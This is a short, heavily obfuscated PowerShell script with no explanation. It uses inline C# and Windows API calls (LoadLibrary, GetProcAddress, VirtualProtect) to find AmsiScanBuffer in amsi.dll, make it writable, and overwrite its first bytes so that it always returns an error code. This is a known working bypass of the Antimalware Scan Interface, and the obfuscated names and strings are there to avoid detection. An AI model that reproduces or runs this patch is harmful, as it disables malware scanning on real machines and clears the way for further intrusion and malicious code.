$AB54EVAdXM = @"
using System;
using System.Runtime.InteropServices;
public class AB54EVAdXM {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr utK4KfDar04i, string apxLjt3HkA0);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr AMq5YtGyfrq15Qok86, UIntPtr WfT3p_HK7JJTSVho, uint HQGMSdok, out uint bejGb8CPJWch);
}
"@

Add-Type $AB54EVAdXM

$wsO6XJ2 = [AB54EVAdXM]::LoadLibrary("$(('âmsì.'+'dll').nOrmAlizE([chAr]([byTE]0x46)+[CHaR](111*29/29)+[ChAr]([bYte]0x72)+[ChaR]([ByTe]0x6d)+[CHaR]([BYTE]0x44)) -replace [CHaR](92)+[chaR](112*29/29)+[CHAr]([ByTE]0x7b)+[ChAR](46+31)+[chAr](110*25/25)+[CHar]([BYtE]0x7d))")
$bCiR = [AB54EVAdXM]::GetProcAddress($wsO6XJ2, "$(('ÁmsìScâ'+'nBûffêr').NOrMaLize([cHaR]([byte]0x46)+[chaR]([Byte]0x6f)+[Char](114+83-83)+[CHar](109+92-92)+[char]([bYTE]0x44)) -replace [CHar](92+80-80)+[ChAr](35+77)+[ChAR](123+89-89)+[CHaR](77*22/22)+[ChAr]([BytE]0x6e)+[CHAR]([ByTe]0x7d))")
$p = 0
[AB54EVAdXM]::VirtualProtect($bCiR, [uint32]5, 0x40, [ref]$p)
$YdUZY0_lbUpn1 = "0xB8"
$vGupPXozeg5FO64lX = "0x57"
$Ebqo8JmOK5eRvzdUL = "0x00"
$P5EXX2 = "0x07"
$oMYC = "0x80"
$v2ZG7 = "0xC3"
$cElvAHVUjuYC901XNN = [Byte[]] ($YdUZY0_lbUpn1,$vGupPXozeg5FO64lX,$Ebqo8JmOK5eRvzdUL,$P5EXX2,+$oMYC,+$v2ZG7)
[System.Runtime.InteropServices.Marshal]::Copy($cElvAHVUjuYC901XNN, 0, $bCiR, 6)